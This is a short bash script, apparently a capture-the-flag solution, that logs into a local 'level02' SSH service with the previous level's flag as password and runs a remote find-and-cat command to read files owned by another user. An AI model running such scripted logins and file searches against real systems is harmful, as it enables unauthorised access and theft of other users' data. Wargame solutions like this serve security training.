#! /bin/bash

if ! command -v sshpass
then
    echo -e "Install sshpass command before executing this shell script."
else
    USER="level02"
    ADDRESS="localhost"
    PORT="4242"
    export SSHPASS=$(cat ../../level01/flag)
    echo -e "\nExploiting level02 ssh server ...\n\n\n"
    result=$(sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "find / -type f -user flag02 2> /dev/null | grep tmp | xargs cat")
    echo -e "\nGot a flag:"
    echo -e $result
fi    
